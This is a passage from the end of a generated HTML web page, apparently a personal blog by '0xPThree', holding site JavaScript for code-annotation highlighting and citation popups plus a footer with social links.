              div.remove();
            }
          });
          selectedAnnoteEl = undefined;
        };
          // Handle positioning of the toggle
      window.addEventListener(
        "resize",
        throttle(() => {
          elRect = undefined;
          if (selectedAnnoteEl) {
            selectCodeLines(selectedAnnoteEl);
          }
        }, 10)
      );
      function throttle(fn, ms) {
      let throttle = false;
      let timer;
        return (...args) => {
          if(!throttle) { // first call gets through
              fn.apply(this, args);
              throttle = true;
          } else { // all the others get throttled
              if(timer) clearTimeout(timer); // cancel #2
              timer = setTimeout(() => {
                fn.apply(this, args);
                timer = throttle = false;
              }, ms);
          }
        };
      }
        // Attach click handler to the DT
        const annoteDls = window.document.querySelectorAll('dt[data-target-cell]');
        for (const annoteDlNode of annoteDls) {
          annoteDlNode.addEventListener('click', (event) => {
            const clickedEl = event.target;
            if (clickedEl !== selectedAnnoteEl) {
              unselectCodeLines();
              const activeEl = window.document.querySelector('dt[data-target-cell].code-annotation-active');
              if (activeEl) {
                activeEl.classList.remove('code-annotation-active');
              }
              selectCodeLines(clickedEl);
              clickedEl.classList.add('code-annotation-active');
            } else {
              // Unselect the line
              unselectCodeLines();
              clickedEl.classList.remove('code-annotation-active');
            }
          });
        }
    const findCites = (el) => {
      const parentEl = el.parentElement;
      if (parentEl) {
        const cites = parentEl.dataset.cites;
        if (cites) {
          return {
            el,
            cites: cites.split(' ')
          };
        } else {
          return findCites(el.parentElement)
        }
      } else {
        return undefined;
      }
    };
    var bibliorefs = window.document.querySelectorAll('a[role="doc-biblioref"]');
    for (var i=0; i<bibliorefs.length; i++) {
      const ref = bibliorefs[i];
      const citeInfo = findCites(ref);
      if (citeInfo) {
        tippyHover(citeInfo.el, function() {
          var popup = window.document.createElement('div');
          citeInfo.cites.forEach(function(cite) {
            var citeDiv = window.document.createElement('div');
            citeDiv.classList.add('hanging-indent');
            citeDiv.classList.add('csl-entry');
            var biblioDiv = window.document.getElementById('ref-' + cite);
            if (biblioDiv) {
              citeDiv.innerHTML = biblioDiv.innerHTML;
            }
            popup.appendChild(citeDiv);
          });
          return popup.innerHTML;
        });
      }
    }
  });
  </script>
</div> <!-- /content -->
<footer class="footer">
  <div class="nav-footer">
    <div class="nav-footer-left">
      &nbsp;
    </div>   
    <div class="nav-footer-center">
      <ul class="footer-items list-unstyled">
    <li class="nav-item">
 © 2025 0xPThree - All Rights Reserved.
  </li>  
</ul>
    </div>
    <div class="nav-footer-right">
      <ul class="footer-items list-unstyled">
    <li class="nav-item compact">
    <a class="nav-link" href="https://signal.me/#eu/PjVScis0spvu9_S_xNysergThKuqsWQFOwQ7xisr7HJgaJT69xC0Ku2fo3Ng0B1">
      <i class="bi bi-signal" role="img">
</i> 
    </a>
  </li>  
    <li class="nav-item compact">
    <a class="nav-link" href="https://github.com/0xpthree">
      <i class="bi bi-github" role="img">
</i> 
    </a>
  </li>  
    <li class="nav-item compact">
    <a class="nav-link" href="../../index.xml">
      <i class="bi bi-rss" role="img">
</i> 
    </a>
  </li>  
</ul>
    </div>
  </div>
</footer>




</body></html>